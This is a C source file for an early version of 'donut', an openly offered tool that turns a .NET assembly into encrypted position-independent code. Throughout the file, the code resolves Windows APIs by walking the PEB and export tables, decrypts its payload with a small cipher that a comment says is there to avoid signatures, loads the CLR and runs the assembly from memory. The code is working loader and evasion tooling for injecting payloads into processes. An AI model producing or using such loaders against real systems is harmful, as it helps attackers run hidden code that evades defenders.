/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "donut.h"
#include <metahost.h>

LPVOID xGetProcAddress(LPVOID pszAPI);
void encrypt(PDONUT_CFG);
#define decrypt(x) encrypt(x)


/**
 * Forms the code that the PIC is generated from.
 * The configration is passed into the PIC as a parameter on the stack.
 * First, we must obtain the relevant data from the config.
 * Then, we must decrypt the payload.
 * Next, load the CLR and the payload.
 * Invoke the method in the payload.
 * 
 */
DWORD WINAPI ThreadProc(LPVOID lpParameter) {
    // "data section"
    HRESULT         hr;
    BOOL            loadable;
    VARIANT         arg, vt, ret;
    ULONG           i;
    BSTR            cls, method, param;
    SAFEARRAY       *sa, *sav;
    SAFEARRAYBOUND  sab[1];
    ICLRMetaHost    *meta;
    ICLRRuntimeInfo *info;
    ICorRuntimeHost *host;
    IUnknown        *unkn;
    AppDomain       *domain;
    Assembly        *assm;
    Type            *pType;
    LoadLibraryA_t  pLoadLibrary;
    PBYTE           p;
    PDONUT_CFG      c=(PDONUT_CFG)lpParameter;
    
    // "code section"
    union {
      LPVOID api_addr[8];
      struct {
        // imports from mscoree.dll
        CLRCreateInstance_t     CLRCreateInstance;
        // imports from OLEAUT32.dll
        SafeArrayCreate_t       SafeArrayCreate;
        SafeArrayCreateVector_t SafeArrayCreateVector;
        SafeArrayPutElement_t   SafeArrayPutElement;
        SafeArrayDestroy_t      SafeArrayDestroy;
        SysAllocString_t        SysAllocString;
        SysFreeString_t         SysFreeString;
      };
    } v_tbl;
    
    // decrypt the configuration and assembly
    decrypt(c);
    
    // resolve address of LoadLibrary
    pLoadLibrary = (LoadLibraryA_t)xGetProcAddress(c->data.xLoadLibraryA);
    
    // load required DLL
    pLoadLibrary(c->data.xmscoree);
    pLoadLibrary(c->data.xoleaut32);
    
    // resolve required API
    v_tbl.api_addr[0] = xGetProcAddress(c->data.xCLRCreateInstance);
    v_tbl.api_addr[1] = xGetProcAddress(c->data.xSafeArrayCreate);
    v_tbl.api_addr[2] = xGetProcAddress(c->data.xSafeArrayCreateVector);
    v_tbl.api_addr[3] = xGetProcAddress(c->data.xSafeArrayPutElement);
    v_tbl.api_addr[4] = xGetProcAddress(c->data.xSafeArrayDestroy);
    v_tbl.api_addr[5] = xGetProcAddress(c->data.xSysAllocString);
    v_tbl.api_addr[6] = xGetProcAddress(c->data.xSysFreeString);
    
    // initialize assembly
    sab[0].lLbound   = 0;
    sab[0].cElements = c->data.assembly_len;
    sa = v_tbl.SafeArrayCreate(VT_UI1, 1, sab);
    
    // copy assembly to safe array
    for(i=0, p=sa->pvData; i<c->data.assembly_len; i++) {
      p[i] = c->data.assembly[i];
    }
    // initialize parameters
    cls    = v_tbl.SysAllocString(c->data.xCLASS);
    method = v_tbl.SysAllocString(c->data.xMETHOD);
    param  = v_tbl.SysAllocString(c->data.xPARAM);
    
    // 1. initialize CLR
    hr = v_tbl.CLRCreateInstance(
      (REFCLSID)&c->data.xCLSID_CLRMetaHost, 
      (REFIID)&c->data.xIID_ICLRMetaHost, 
      (LPVOID*)&meta);
      
    if(SUCCEEDED(hr)) {
      // 2. obtain runtime information
      hr = meta->lpVtbl->GetRuntime(
        meta, c->data.xRUNTIME, 
        (REFIID)&c->data.xIID_ICLRRuntimeInfo, &info);
        
      if(SUCCEEDED(hr)) {
        // 3. check if runtime is loadable
        hr = info->lpVtbl->IsLoadable(info, &loadable);
        
        if(SUCCEEDED(hr) && loadable) {
          // 4. load the CLR into current process
          hr = info->lpVtbl->GetInterface(
            info, (REFCLSID)&c->data.xCLSID_CorRuntimeHost, 
            (REFIID)&c->data.xIID_ICorRuntimeHost, &host);
            
          if(SUCCEEDED(hr)) {
            // 5. start the CLR
            hr = host->lpVtbl->Start(host);
            
            if(SUCCEEDED(hr)) {
              // 6. obtain pointer to AppDomain infterface
              hr = host->lpVtbl->GetDefaultDomain(
                host, &unkn);
                
              if(SUCCEEDED(hr)) {
                hr = unkn->lpVtbl->QueryInterface(
                  unkn, (REFIID)&c->data.xIID_AppDomain, &domain);
                  
                if(SUCCEEDED(hr)) {
                  // 7. load assembly from memory
                  hr = domain->lpVtbl->Load_3(
                    domain, sa, &assm);
                    
                  if(SUCCEEDED(hr)) {
                    // 8. invoke method    
                    ZeroMemory(&vt, sizeof(vt));
                  
                    // Get the Type of Runner.
                    hr = assm->lpVtbl->GetType_2(assm, cls, &pType);
                    if(SUCCEEDED(hr)) {
                      // allocate array for single parameter
                      sav = v_tbl.SafeArrayCreateVector(VT_VARIANT, 0, 1);
                      
                      if(sav != NULL) {
                        // store parameter
                        V_BSTR(&arg) = param;
                        V_VT(&arg)   = VT_BSTR;
                        i            = 0;
                        hr = v_tbl.SafeArrayPutElement(sav, &i, &arg);
                        
                        if(SUCCEEDED(hr)) {
                          // invoke method
                          hr = pType->lpVtbl->InvokeMember_3(
                            pType, method, 
                            BindingFlags_InvokeMethod | 
                            BindingFlags_Static       | 
                            BindingFlags_Public,
                            NULL, vt, sav, &ret);
                        }
                        v_tbl.SafeArrayDestroy(sav);
                      }
                      pType->lpVtbl->Release(pType);
                    }
                    assm->lpVtbl->Release(assm);
                  }
                  domain->lpVtbl->Release(domain);
                }
                unkn->lpVtbl->Release(unkn);
              }
              host->lpVtbl->Stop(host);
            }
            host->lpVtbl->Release(host);
          }
        }
        info->lpVtbl->Release(info);
      }
      meta->lpVtbl->Release(meta);
    }
    
    // wipe configuration from memory?
    
    // cleanup
    v_tbl.SafeArrayDestroy(sa);
    v_tbl.SysFreeString(cls);
    v_tbl.SysFreeString(method);
    v_tbl.SysFreeString(param);
    
    return 0;
}
    
#if defined(CHAM)
void cham(void *mk, void *p){
    uint32_t rk[8],*w=p,*k=mk,i,t;

    // create sub keys from 128-bit key
    for(i=0;i<4;i++) {
      t=k[i]^ROTR(k[i],31),
      rk[i]=t^ROTR(k[i],24),
      rk[(i+4)^1]=t^ROTR(k[i],21);
    }
    // encrypt 128-bits
    for(i=0;i<80;i++) {
      t=w[3],w[0]^=i,w[3]=rk[i&7],
      w[3]^=ROTR(w[1],(i&1)?24:31),
      w[3]+=w[0],
      w[3]=ROTR(w[3],(i&1)?31:24),
      w[0]=w[1],w[1]=w[2],w[2]=t;
    }
}
#elif defined(CHASKEY)
void chaskey(void *mk, void *p) {
    uint32_t i,*w=p,*k=mk;

    // add key
    for(i=0;i<4;i++) w[i]^=k[i];
    // apply permutation
    for(i=0;i<16;i++) {
      w[0]+=w[1],
      w[1]=ROTR(w[1],27)^w[0],
      w[2]+=w[3],
      w[3]=ROTR(w[3],24)^w[2],
      w[2]+=w[1],
      w[0]=ROTR(w[0],16)+w[3],
      w[3]=ROTR(w[3],19)^w[0],
      w[1]=ROTR(w[1],25)^w[2],
      w[2]=ROTR(w[2],16);
    }
    // add key
    for(i=0;i<4;i++) w[i]^=k[i];
}
#elif defined(NOEKEON)
void noekeon(void *mk, void *p) {
    uint32_t t,*k=mk,*w=p;
    uint8_t  rc=128;

    // perform 16 rounds of encryption
    for(;;) {
      w[0]^=rc;t=w[0]^w[2];t^=ROTR(t,8)^ROTR(t,24);
      w[1]^=t;w[3]^=t;w[0]^=k[0];w[1]^=k[1];
      w[2]^=k[2];w[3]^=k[3];t=w[1]^w[3];
      t^=ROTR(t,8)^ROTR(t,24);w[0]^=t;w[2]^=t;
      if(rc==212)break;
      rc=((rc<<1)^((-(rc>>7))&27));
      w[1]=ROTR(w[1],31);w[2]=ROTR(w[2],27);w[3]=ROTR(w[3],30);
      w[1]^=~(w[3]|w[2]);t=w[3];w[3]=w[0]^(w[2]&w[1]);w[0]=t;
      w[2]^=w[0]^w[1]^w[3];w[1]^=~(w[3]|w[2]);w[0]^=w[2]&w[1];
      w[1]=ROTR(w[1],1);w[2]=ROTR(w[2],5);w[3]=ROTR(w[3],2);
    }
}
#else
void speck(void *mk, void *p) {
    uint32_t k[4],*x=p,i,t;
    
    // copy master key to local buffer
    for(i=0;i<4;i++) k[i]=((uint32_t*)mk)[i];
    
    for(i=0;i<27;i++) {
      // encrypt plaintext
      x[0] = (ROTR(x[0],8)  + x[1]) ^ k[0],
      x[1] =  ROTR(x[1],29) ^ x[0], t = k[3],
      
      // create next subkey
      k[3] = (ROTR(k[1],8)  + k[0]) ^ i,
      k[0] =  ROTR(k[0],29) ^ k[3],
      k[1] = k[2], k[2] = t;
    }
}
#endif

// encrypt/decrypt data in counter mode
void encrypt(PDONUT_CFG c) {
    uint8_t      x[CIPHER_BLK_LEN], *p=(uint8_t*)&c->data;
    int          i, r, len = c->data_len;
    PDONUT_CRYPT ctx=(PDONUT_CRYPT)&c->ctx;
    
    while(len) {
      // copy counter+nonce to local buffer
      for(i=0;i<CIPHER_BLK_LEN;i++) 
        x[i] = ctx->ctr[i];
      
      // encrypt x
      ENCRYPT(ctx->key, &x);
      
      // XOR plaintext with ciphertext
      r = len > CIPHER_BLK_LEN ? CIPHER_BLK_LEN : len;
      
      for(i=0;i<r;i++) 
        p[i] ^= x[i];
      
      // update length + position
      len -= r; p += r;
      
      // update counter
      for(i=CIPHER_BLK_LEN;i>0;i--)
        if(++ctx->ctr[i-1]) break;
    }
}

#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// locate address of API in export table
LPVOID FindExport(LPVOID base, PCHAR pszAPI){
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   cnt, rva, dll_h;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;
    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll;
    LPVOID                  api_adr=NULL;
    
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no export table, return NULL
    if (rva==0) return NULL;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;
    
    // if no api names, return NULL
    if (cnt==0) return NULL;
    
    adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    do {
      // calculate hash of api string
      api = RVA2VA(PCHAR, base, sym[cnt-1]);
      // add to DLL hash and compare
      if (!xstrcmp(pszAPI, api)){
        // return address of function
        api_adr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
        return api_adr;
      }
    } while (--cnt && api_adr==0);
    return api_adr;
}

#ifndef _MSC_VER
#ifdef __i386__
/* for x86 only */
unsigned long __readfsdword(unsigned long Offset)
{
   unsigned long ret;
   __asm__ volatile ("movl  %%fs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) Offset)));
   return ret;
}
#else
/* for __x86_64 only */
unsigned __int64 __readgsqword(unsigned long Offset)
{
   void *ret;
   __asm__ volatile ("movq  %%gs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) (unsigned __int64) Offset)));
   return (unsigned __int64) ret;
}
#endif
#endif

// search all modules in the PEB for API
LPVOID xGetProcAddress(LPVOID pszAPI) {
    PPEB                  peb;
    PPEB_LDR_DATA         ldr;
    PLDR_DATA_TABLE_ENTRY dte;
    LPVOID                api_adr=NULL;
    
  #if defined(_WIN64)
    peb = (PPEB) __readgsqword(0x60);
  #else
    peb = (PPEB) __readfsdword(0x30);
  #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && api_adr == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // search the export table for api
      api_adr=FindExport(dte->DllBase, (PCHAR)pszAPI);  
    }
    return api_adr;
}

// same as strcmp
int xstrcmp(char *s1, char *s2){
    while(*s1 && (*s1==*s2))s1++,s2++;
    return (int)*(unsigned char*)s1 - *(unsigned char*)s2;
}

#ifndef PIC
#include <stdio.h>

GUID IID_AppDomain = 
{ 0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13}};

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "shell32.lib")

// allocate memory
LPVOID xmalloc (SIZE_T dwSize) {
    return HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
}

// re-allocate memory
LPVOID xrealloc (LPVOID lpMem, SIZE_T dwSize) { 
    return HeapReAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, lpMem, dwSize);
}

// free memory
void xfree (LPVOID lpMem) {
    HeapFree (GetProcessHeap(), 0, lpMem);
}

BOOL GetRuntimeVersion(PWCHAR path, PWCHAR version, DWORD buflen) {
    ICLRMetaHost *meta  = NULL;
    HRESULT      hr     = S_OK; 
    DWORD        len    = buflen;
    
    hr = CLRCreateInstance(&CLSID_CLRMetaHost, 
      &IID_ICLRMetaHost, (LPVOID*)&meta);
    if(hr == S_OK) {
      hr = meta->lpVtbl->GetVersionFromFile(meta, path, version, &len);
      meta->lpVtbl->Release(meta);
    }
    return hr == S_OK;
}

int main(void) {
    PDONUT_CFG  cfg = NULL; //The _DONUT_CFG struct that contains the crypto information and data
    int         argc, i;
    PWCHAR      *argv, path, cls, method, param;
    BYTE        x, *p;
    WCHAR       version[32];
    HANDLE      hFile, hThread;
    DWORD       rd, cfg_len;
    DONUT_CRYPT ctx; //key information
    
    argv=CommandLineToArgvW(GetCommandLine(), &argc);
    
    // if we don't have five parameters, show usage and exit
    if(argc!=5) {
      wprintf(L"\nusage: donut <assembly.dll> <class> <method> <parameter>\n");
      return 0;
    }
    path=argv[1]; cls=argv[2]; method=argv[3]; param=argv[4];
    
    if(lstrlen(cls) >= 32) {
      wprintf(L"the class name is too long.\n");
      return 0;
    }

    if(lstrlen(method) >= 32) {
      wprintf(L"the method name is too long.\n");
      return 0;
    }

    if(lstrlen(param) >= 32) {
      wprintf(L"the method parameter is too long.\n");
      return 0;
    }
    
    if(!GetRuntimeVersion(path, version, ARRAYSIZE(version))) {
      wprintf(L"unable to obtain runtime version from assembly.\n");
      return 0;
    }
      
    // try open the assembly
    hFile = CreateFile(path, GENERIC_READ, 
      FILE_SHARE_READ, 0, OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, NULL);
    
    // if nothing opened, exit
    if(hFile == INVALID_HANDLE_VALUE) {
      wprintf(L"unable to open assembly.\n");
      return 0;
    }
    
    cfg_len = GetFileSize(hFile, 0);
    // allocate memory for configuration and assembly
    cfg = (PDONUT_CFG)xmalloc(cfg_len + sizeof(DONUT_CFG));
      
    if(cfg != NULL) {
      // store assembly in memory
      cfg->data.assembly_len = cfg_len;
      ReadFile(hFile, &cfg->data.assembly, cfg_len, &rd, 0);
    }
    CloseHandle(hFile);
     
    if(cfg == NULL) {
      wprintf(L"unable to allocate memory for assembly.\n");
      return 0;
    }

    // Generate a random key
    
    // we don't really need secure generation of key,nonce and counter here.
    // we just want something to hide data that can be easily used to generate
    // signatures.
    srand(time(0));
    p=(uint8_t*)&ctx;
    
    for (i=0; i<sizeof(DONUT_CRYPT); i++) {
      do {
        x = (uint8_t)(rand() % 256);
      } while (x==0);
      // save byte
      p[i] = x;
    }
    
    // set the key and counter
    memcpy(&cfg->ctx, &ctx, sizeof(DONUT_CRYPT));

    // Build the configuration that will be saved to donut.cfg
    // The .NET payload and its configuration will be encrypted and saved to the file.
    // In the target process, the PIC will be written first. Then, the configuration.
    // When the PIC executes, it will decrypt the payload and its config.
    // Next, it will boostrap the CLR using the Unmanaged CLR Hosting API.
    // Finally, the .NET Assembly will be loaded through the CLR and the appropriate method will be invoked.


    // copy GUID structures
    memcpy(&cfg->data.xCLSID_CLRMetaHost,    &CLSID_CLRMetaHost,    sizeof(GUID));
    memcpy(&cfg->data.xIID_ICLRMetaHost,     &IID_ICLRMetaHost,     sizeof(GUID));
    memcpy(&cfg->data.xIID_ICLRRuntimeInfo,  &IID_ICLRRuntimeInfo,  sizeof(GUID));
    memcpy(&cfg->data.xCLSID_CorRuntimeHost, &CLSID_CorRuntimeHost, sizeof(GUID));
    memcpy(&cfg->data.xIID_ICorRuntimeHost,  &IID_ICorRuntimeHost,  sizeof(GUID));
    memcpy(&cfg->data.xIID_AppDomain,        &IID_AppDomain,        sizeof(GUID));
    
    // copy DLL
    strcpy(cfg->data.xmscoree,  "mscoree.dll");
    strcpy(cfg->data.xoleaut32, "oleaut32.dll");
    
    // copy api
    strcpy(cfg->data.xLoadLibraryA,          "LoadLibraryA");
    strcpy(cfg->data.xCLRCreateInstance,     "CLRCreateInstance");
    strcpy(cfg->data.xSafeArrayCreate,       "SafeArrayCreate");
    strcpy(cfg->data.xSafeArrayCreateVector, "SafeArrayCreateVector");
    strcpy(cfg->data.xSafeArrayPutElement,   "SafeArrayPutElement");
    strcpy(cfg->data.xSafeArrayDestroy,      "SafeArrayDestroy");
    strcpy(cfg->data.xSysAllocString,        "SysAllocString");
    strcpy(cfg->data.xSysFreeString,         "SysFreeString");
    
    // copy assembly parameters
    lstrcpy(cfg->data.xCLASS,   cls);
    lstrcpy(cfg->data.xMETHOD,  method);
    lstrcpy(cfg->data.xPARAM,   param);
    lstrcpy(cfg->data.xRUNTIME, version);
    
    // encrypt it
    cfg_len += sizeof(DONUT_DATA);
    cfg->data_len = cfg_len;
    encrypt(cfg);
    
    // because we used the counter to encrypt configuration
    // need to reset back to original before saving.
    // set the key and counter
    memcpy(&cfg->ctx, &ctx, sizeof(DONUT_CRYPT));
    
    // save configuration to disk
    hFile=CreateFile(L"donut.cfg", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 
      FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(hFile!=INVALID_HANDLE_VALUE) {
      WriteFile(hFile, cfg, cfg_len, &rd, NULL);
      CloseHandle(hFile);
    }

    // Create a thread from the ThreadProc address (containing the PIC)
    // Pass the config to the PIC as an argument on the stack.

    // perform a test run
    hThread = CreateThread(NULL, 0, ThreadProc, cfg, 0, NULL);
    
    wprintf(L"Waiting 10 seconds...\n");
    WaitForSingleObject(hThread, 10*1000);
    
    return 0;
}
#endif
